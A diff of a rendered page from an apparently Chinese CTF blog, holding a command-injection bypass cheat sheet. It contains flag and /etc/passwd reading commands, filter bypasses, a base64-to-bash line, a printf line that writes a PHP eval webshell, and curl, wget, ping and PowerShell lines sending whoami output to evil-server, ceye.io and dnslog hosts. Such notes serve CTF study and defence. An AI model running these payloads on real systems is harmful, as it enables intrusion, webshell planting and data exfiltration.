@@ -454,7 +454,7 @@ height:50vh;
 </ul>
 <h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat flag /&#123;cat,flag&#125;</span><br><span class="line">more flag</span><br><span class="line">less flag</span><br><span class="line">bzmore flag</span><br><span class="line">bzless flag</span><br><span class="line">head flag</span><br><span class="line">tail flag</span><br><span class="line">tailf flag </span><br><span class="line">tac flag</span><br><span class="line">nl flag</span><br><span class="line">od -a flag</span><br><span class="line"></span><br><span class="line">fire flag</span><br><span class="line">wc flag</span><br><span class="line">uniq flag</span><br><span class="line">diff flag flag1.txt</span><br><span class="line">sed -n &apos;1,2p&apos; flag</span><br><span class="line">find -P flag</span><br><span class="line">strings flag</span><br><span class="line">curl file:///root/flag</span><br><span class="line">sort flag</span><br><span class="line">bash -v flag </span><br><span class="line">rev flag</span><br><span class="line">paste ./flag.txt /etc/passwd</span><br></pre></td></tr></table></figure>
 
-<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="多条命令"><a href="#多条命令" class="headerlink" title="多条命令"></a>多条命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">%</span>0a、%0d    换行符与回车符</span><br><span class="line">|           第一条命令结果作为第二条命令的输入</span><br><span class="line">||          第一条执行失败，执行第二条命令</span><br><span class="line">;           连续指令功能。</span><br><span class="line">&amp;           连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          当第一条执行成功后执行后续命令</span><br><span class="line"></span><br><span class="line">echo 666`date` =&gt; 666Tue 14 May 2019 07:15:23 AM EDT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Windows</span><br><span class="line">Copy %0a</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span>1a - 一个神奇的角色，作为.bat文件中的命令分隔符</span><br><span class="line">&lt;?php</span><br><span class="line">    $command = 'dir '.$_POST['dir'];</span><br><span class="line">    $escaped_command = escapeshellcmd($command);</span><br><span class="line">    file_put_contents('out.bat',$escaped_command);</span><br><span class="line">    system('out.bat');</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="多条命令"><a href="#多条命令" class="headerlink" title="多条命令"></a>多条命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">0a、%0d    换行符与回车符</span></span><br><span class="line">|           第一条命令结果作为第二条命令的输入</span><br><span class="line">||          第一条执行失败，执行第二条命令</span><br><span class="line">;           连续指令功能。</span><br><span class="line">&amp;           连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          当第一条执行成功后执行后续命令</span><br><span class="line"></span><br><span class="line">echo 666`date` =&gt; 666Tue 14 May 2019 07:15:23 AM EDT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows</span></span><br><span class="line">Copy %0a</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">1a - 一个神奇的角色，作为.bat文件中的命令分隔符</span></span><br><span class="line">&lt;?php</span><br><span class="line">    $command = 'dir '.$_POST['dir'];</span><br><span class="line">    $escaped_command = escapeshellcmd($command);</span><br><span class="line">    file_put_contents('out.bat',$escaped_command);</span><br><span class="line">    system('out.bat');</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="绕过-escapeshellcmd"><a href="#绕过-escapeshellcmd" class="headerlink" title="绕过 escapeshellcmd"></a>绕过 escapeshellcmd</h3><ul>
 <li>win 下执行 bat</li>
@@ -467,7 +467,7 @@ height:50vh;
 <h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><ul>
 <li>${IFS}</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">cat$</span>&#123;IFS&#125;flag</span><br><span class="line"><span class="meta">cat$</span>&#123;IFS&#125;$9flag</span><br><span class="line"><span class="meta">cat$</span>IFS$9flag</span><br><span class="line"><span class="meta">cat%</span>09flag  # \0x09 是 TAB</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;<span class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat%</span><span class="bash">09flag  <span class="comment"># \0x09 是 TAB</span></span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>重定向符&lt;&gt;</li>
@@ -486,7 +486,7 @@ height:50vh;
 <ul>
 <li>编码</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`echo "Y2F0IGZsYWc="|base64 -d`</span><br><span class="line">echo "Y2F0IGZsYWc="|base64 -d|bash</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span>(printf "\x63\x61\x74\x20\x66\x6c\x61\x67")</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;</span><br><span class="line"><span class="meta">$</span> &#123;printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`echo "Y2F0IGZsYWc="|base64 -d`</span><br><span class="line">echo "Y2F0IGZsYWc="|base64 -d|bash</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x66\x6c\x61\x67"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">可以通过这样来写webshell,内容为&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);?&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> &#123;<span class="built_in">printf</span>,<span class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>单引号、双引号</li>
@@ -506,7 +506,7 @@ height:50vh;
 <ul>
 <li>未定义变量</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">cat$</span>x /etc/passwd</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">x /etc/passwd</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>可变函数</li>
@@ -540,12 +540,12 @@ height:50vh;
 <ul>
 <li>HTTP 外带</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span> linux</span><br><span class="line">curl http://evil-server/`whoami`</span><br><span class="line">wget http://evil-server/$(whoami)</span><br><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> windows</span><br><span class="line">http:</span><br><span class="line">for /F %x in ('whoami') do start http://xxx.ceye.io/%x</span><br><span class="line">dns请求：</span><br><span class="line">获取计算机名：for /F "delims=" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line">获取用户名：for /F "delims= tokens=2" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line"></span><br><span class="line">for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> linux</span></span><br><span class="line">curl http://evil-server/`whoami`</span><br><span class="line">wget http://evil-server/$(whoami)</span><br><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> windows</span></span><br><span class="line">http:</span><br><span class="line">for /F %x in ('whoami') do start http://xxx.ceye.io/%x</span><br><span class="line">dns请求：</span><br><span class="line">获取计算机名：for /F "delims=" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line">获取用户名：for /F "delims= tokens=2" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line"></span><br><span class="line">for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);</span><br></pre></td></tr></table></figure>
 
 <h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><ul>
 <li>文件构造（参考橘子那个 hitcon）</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span>w</span><br><span class="line">将会创建一个名字为 w 的空文件。</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">w</span></span><br><span class="line">将会创建一个名字为 w 的空文件。</span><br></pre></td></tr></table></figure>
 
 <p>工具</p>
 <ul>
@@ -725,6 +725,36 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1811,12 +1841,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
         </li>
     
     
@@ -1875,12 +1905,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
         </li>
     
     
@@ -1918,15 +1948,15 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
-    
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="读书笔记"><span class="iconfont-archer">&#xe606;</span>读书笔记</span>
-    
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
     
@@ -1944,6 +1974,8 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="smarty"><span class="iconfont-archer">&#xe606;</span>smarty</span>
     
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
@@ -1956,13 +1988,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
-        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
-    
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
-        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
-    
         <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
